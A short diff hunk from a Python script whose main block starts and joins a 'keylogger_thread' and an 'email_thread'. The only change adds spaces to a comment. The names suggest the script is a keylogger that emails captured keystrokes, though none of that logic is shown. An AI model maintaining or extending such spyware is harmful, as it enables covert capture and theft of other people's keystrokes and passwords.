@@ -106,7 +106,7 @@ if __name__ == "__main__":
         keylogger_thread.start()
         email_thread.start()
 
-        # Keep the main thread alive
+        # Keep the main thread   alive
         keylogger_thread.join()
         email_thread.join()
     except KeyboardInterrupt:
